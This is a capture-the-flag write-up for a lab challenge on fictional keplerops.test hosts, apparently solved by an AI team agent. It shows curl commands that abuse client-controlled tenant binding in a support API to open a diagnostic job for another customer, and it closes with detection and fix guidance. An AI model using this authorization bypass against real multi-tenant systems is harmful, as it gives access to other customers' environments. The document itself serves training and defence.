# K27.1 — A job for that customer

> **Category:** 2. KeplerOps · **Points:** 100 · **Difficulty:** medium
> **Solved by:** team agent

## Where this happens

![Range map — three segments, hosts and services](../docs/img/segments.png)

Primary service for this card: `support.keplerops.test`. The map shows which segment it sits in and how
traffic reaches it (browser terminal → kali → rowan-dev → SOCKS relay → 10.77.x).

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Client-controlled tenant binding — a support account scoped to its own customers can open a diagnostic job for another tenant by naming an active connector revision |
| **Tools** | `curl`, the support integration bearer, the delivery client document |
| **Attack surface** | `https://support.keplerops.test:8443/api/customers/{tenant}/diagnostics` |
| **Prerequisite** | The support integration token (`fk_support_rowan_…`, principal `rowan.ito`) and a known active tenant/revision pair |
| **Flag** | accepted, value not recorded |

**What you are about to read:** how "which customer is this for?" becomes a request parameter
instead of an authorization decision, letting a support identity open work against an
unregistered customer.

## Objective

> Bind a support diagnostic job to the active ARWC connector despite the support account's
> ordinary customer restrictions.

Not code execution yet — only a job correctly *bound*: right tenant, right revision, an id.

## Background you need

- The support integration API is the workflow layer for customer diagnostics: create, read
  back, attach a package, deliver.
- A **tenant** (`TEN-ARWC-047`) is the customer boundary; a **connector revision**
  (`FLK-7.4.2`) is the software that customer runs. "Active" means the revision published on
  that customer's channel, not the newest version in the registry.
- Support accounts are normally *scoped* to the customers attached to their registrations, and
  the API should derive the tenant from that relationship. When the tenant arrives in the URL,
  the relationship becomes a lookup key instead of an authorization input.

## Walkthrough

### 1. Recon — read the published contract first

```bash
TOK=fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b
curl -sS --socks5-hostname 127.0.0.1:1080 --cacert /home/kali/ctf/ca.crt \
  -H "Authorization: Bearer $TOK" \
  https://support.keplerops.test:8443/.well-known/fieldkest-client
```

It names the four diagnostic operations: create takes the tenant in the **path** and a
`connector_revision` in the **body**. Nothing states the tenant must be in your registration.
### 2. Finding the flaw — resolve what "active" means for ARWC

A job is accepted only when the revision matches what the customer runs, so resolve it from
delivery rather than guessing:

```bash
curl -sS --socks5-hostname 127.0.0.1:1080 --cacert /home/kali/ctf/ca.crt \
  -u 'rowan.ito:<fk_developer token>' \
  https://delivery.keplerops.test:8443/api/package-meta/fieldlink-connector
```

Package metadata exposes released versions and per-channel state, including ARWC's current and
rollback slots. The active connector is `FLK-7.4.2` on asset `CRR-OG2`; `7.4.3-cinder.rset1` is
pending and not what the customer runs.

### 3. Exploitation — create the job with the customer named explicitly

```bash
curl -sS --socks5-hostname 127.0.0.1:1080 --cacert /home/kali/ctf/ca.crt \
  -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"connector_revision":"FLK-7.4.2"}' \
  https://support.keplerops.test:8443/api/customers/TEN-ARWC-047/diagnostics
```

The response is a job handle; `GET /api/diagnostics/{job}` shows the tenant and revision the
server recorded — bound to `TEN-ARWC-047`, not to whichever customer the support registration
implies.

Two details matter: body field is the **version**, path segment the **customer** (one without
the other describes no real installation); and if the customer list were enforced, the correct
behaviour here would be a denial.

### 4. Getting the flag

Solved by a team agent; the accepted value is not recorded. The scoring condition is a job
whose recorded tenant/revision pair is the active ARWC connector.

## Why this works (the vulnerability explained)

The bug class is **client-controlled tenant binding**: an authorization boundary modelled as
data the caller supplies.

1. **The tenant is a parameter, not a derivation.** Correct code derives the customer from the
   authenticated support relationship (registration, case, entitlement) and rejects a conflict.
2. **"Does this exist?" replaces "may this caller act on it?"** Checking that `TEN-ARWC-047` +
   `FLK-7.4.2` describes a real installation is a *consistency* check, satisfied by anyone who
   knows the pair — and delivery publishes the pair.
3. **Support tooling is trusted more than support people.** The diagnostic channel exists so a
   vendor engineer can act inside a customer installation; once a job is bound the workflow
   treats it as sanctioned, so binding is a real escalation.

Same shape as IDOR, except the object is a *workflow*: the identifier you control selects whose
environment your later actions land in.

## Detection and fix

- **Detect:** diagnostic jobs whose tenant is absent from the creator's registrations;
  creation shortly after a package-metadata read for that tenant.
- **Fix:** derive the tenant server-side from the authenticated principal (or an explicit
  case/attachment it is entitled to) and reject any disagreeing path or body; treat the revision
  as a constraint, not a lookup key. Log tenant, revision and creator together at creation.

## Notes and dead ends

- Evidence is thin: the card retains the description, the documented diagnostic contract and
  the tenant/asset pairs `TEN-ARWC-047`/`CRR-OG2`, `TEN-RILL-022`/`RILL-PUMP-442`. The
  transcript is **reconstructed**; no per-card response was retained.
- Guessing the revision is a dead end: `7.4.3-cinder.rset1` exists but describes no valid
  installation. The staff mTLS certificate is no substitute for the support bearer — the ARWC
  relay rejects staff identities, and that path belongs to a later card.
